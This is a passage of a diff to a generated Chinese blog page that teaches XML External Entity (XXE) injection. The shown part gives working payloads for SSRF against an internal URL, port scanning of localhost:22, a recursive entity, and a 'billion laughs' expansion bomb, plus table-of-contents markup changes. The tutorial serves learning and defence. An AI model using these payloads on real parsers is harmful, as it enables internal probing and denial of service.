+<p>这个 XML 文档会使解析器向 <code>http://internal-service.local/secret</code> 发送请求，并将响应包含在返回的XML文档中。</p>
+<h3 id="本地端口扫描"><a href="#本地端口扫描" class="headerlink" title="本地端口扫描"></a>本地端口扫描</h3><p>攻击者可以利用XXE来使服务器对其自身进行端口扫描，以检测内部网络服务。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:22&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>这个 XML 文档会使解析器尝试连接本地的 22 端口（通常是 SSH
-服务），从响应中可以判断该端口是否开放。</p>
-<h3 id="拒绝服务dos">拒绝服务（DoS）</h3>
-<p>如果禁用外部实体加载那么就无法泄露，但是我们仍然可以进行拒绝服务攻击。通过XXE攻击，可以构造递归实体，使解析器陷入无限循环，从而耗尽系统资源，导致拒绝服务（DoS）攻击。</p>
-<p>不过现代 XML 解析器都具有循环实体引用检测功能，以防止 DoS
-攻击。因此，即使尝试在 XML 中使用循环实体引用来引发 DoS
-攻击，解析器也会检测并阻止这种行为，确保系统安全。</p>
+
+<p>这个 XML 文档会使解析器尝试连接本地的 22 端口（通常是 SSH 服务），从响应中可以判断该端口是否开放。</p>
+<h3 id="拒绝服务（DoS）"><a href="#拒绝服务（DoS）" class="headerlink" title="拒绝服务（DoS）"></a>拒绝服务（DoS）</h3><p>如果禁用外部实体加载那么就无法泄露，但是我们仍然可以进行拒绝服务攻击。通过XXE攻击，可以构造递归实体，使解析器陷入无限循环，从而耗尽系统资源，导致拒绝服务（DoS）攻击。</p>
+<p>不过现代 XML 解析器都具有循环实体引用检测功能，以防止 DoS 攻击。因此，即使尝试在 XML 中使用循环实体引用来引发 DoS 攻击，解析器也会检测并阻止这种行为，确保系统安全。</p>
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;&amp;xxe;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">bomb</span> [</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY a <span class="string">&quot;a&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY b <span class="string">&quot;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY c <span class="string">&quot;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY d <span class="string">&quot;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY e <span class="string">&quot;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY f <span class="string">&quot;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY g <span class="string">&quot;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY h <span class="string">&quot;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY i <span class="string">&quot;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY j <span class="string">&quot;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">        ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bomb</span>&gt;</span><span class="symbol">&amp;j;</span><span class="tag">&lt;/<span class="name">bomb</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 		</div>
@@ -880,7 +760,7 @@ XXE，使解析器向内网或其他服务器发送请求。攻击者可以利�
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">XML 外部实体注入漏洞</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xml%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80"><span class="nav-text">XML（可扩展标记语言）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xml-%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="nav-text">XML 的定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xml-%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="nav-text">XML 的语法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dtd%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89"><span class="nav-text">DTD（文档类型定义）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dtd-%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="nav-text">DTD 的定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dtd-%E5%9C%A8-xml-%E4%B8%AD%E7%9A%84%E5%A3%B0%E6%98%8E"><span class="nav-text">DTD 在 XML 中的声明</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E9%83%A8-dtd-%E5%A3%B0%E6%98%8E"><span class="nav-text">内部 DTD 声明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8-dtd-%E5%A3%B0%E6%98%8E"><span class="nav-text">外部 DTD 声明</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dtd-%E5%AE%9E%E4%BD%93%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-text">DTD 实体的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93"><span class="nav-text">普通实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-text">参数实体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dtd-%E5%AE%9E%E4%BD%93%E7%9A%84%E5%BC%95%E7%94%A8"><span class="nav-text">DTD 实体的引用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93"><span class="nav-text">引用普通实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-text">引用参数实体</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xml-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="nav-text">XML 外部实体注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xml-%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-text">XML 注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8-dtd-%E5%A3%B0%E6%98%8E%E6%B3%A8%E5%85%A5"><span class="nav-text">外部 DTD 声明注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="nav-text">外部实体注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#blind-xxe"><span class="nav-text">Blind XXE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xml-%E6%B3%A8%E5%85%A5%E5%BA%94%E7%94%A8"><span class="nav-text">XML 注入应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB"><span class="nav-text">文件泄露攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0ssrf"><span class="nav-text">服务器端请求伪造（SSRF）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">本地端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1dos"><span class="nav-text">拒绝服务（DoS）</span></a></li></ol></li></ol></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XML%EF%BC%88%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80%EF%BC%89"><span class="nav-text">XML（可扩展标记语言）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="nav-text">XML 的定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E7%9A%84%E8%AF%AD%E6%B3%95"><span class="nav-text">XML 的语法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DTD%EF%BC%88%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89%EF%BC%89"><span class="nav-text">DTD（文档类型定义）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DTD-%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="nav-text">DTD 的定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DTD-%E5%9C%A8-XML-%E4%B8%AD%E7%9A%84%E5%A3%B0%E6%98%8E"><span class="nav-text">DTD 在 XML 中的声明</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E9%83%A8-DTD-%E5%A3%B0%E6%98%8E"><span class="nav-text">内部 DTD 声明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8-DTD-%E5%A3%B0%E6%98%8E"><span class="nav-text">外部 DTD 声明</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DTD-%E5%AE%9E%E4%BD%93%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-text">DTD 实体的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93"><span class="nav-text">普通实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-text">参数实体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DTD-%E5%AE%9E%E4%BD%93%E7%9A%84%E5%BC%95%E7%94%A8"><span class="nav-text">DTD 实体的引用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="nav-text">特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93"><span class="nav-text">引用普通实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="nav-text">引用参数实体</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="nav-text">XML 外部实体注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-text">XML 注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8-DTD-%E5%A3%B0%E6%98%8E%E6%B3%A8%E5%85%A5"><span class="nav-text">外部 DTD 声明注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="nav-text">外部实体注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-XXE"><span class="nav-text">Blind XXE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E6%B3%A8%E5%85%A5%E5%BA%94%E7%94%A8"><span class="nav-text">XML 注入应用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB"><span class="nav-text">文件泄露攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89"><span class="nav-text">服务器端请求伪造（SSRF）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">本地端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%EF%BC%88DoS%EF%BC%89"><span class="nav-text">拒绝服务（DoS）</span></a></li></ol></li></ol></li></ol>
 
 	</div>
 </div>
@@ -911,7 +791,7 @@ XXE，使解析器向内网或其他服务器发送请求。攻击者可以利�
                     </span>
                     
                         <span>
-                            379.8k words in total
+                            380.1k words in total
                         </span>
                     
                 </p>
